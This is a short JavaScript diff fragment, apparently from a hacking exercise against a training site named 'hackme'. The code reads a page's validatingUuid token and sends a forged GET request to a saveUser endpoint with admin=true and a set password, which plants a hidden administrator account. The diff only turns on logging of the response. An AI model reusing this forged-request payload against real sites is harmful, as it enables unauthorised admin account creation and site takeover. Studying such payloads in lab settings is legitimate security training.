@@ -14,7 +14,7 @@ var validatingUuidValue = $("[name='validatingUuid']")[0].value;
 //console.log("3." + validatingUuidValue);
 req.open('GET', 'http://hackme.groupinfra.com/'+pagename+'/pages/saveUser?name=kriegerv&password=toto&admin=true&id=-1&validatingUuid='+ validatingUuid, false);
 req.send(null);
-//console.log("4." + req.responseText);
+console.log("4." + req.responseText);
 }
 }
 }
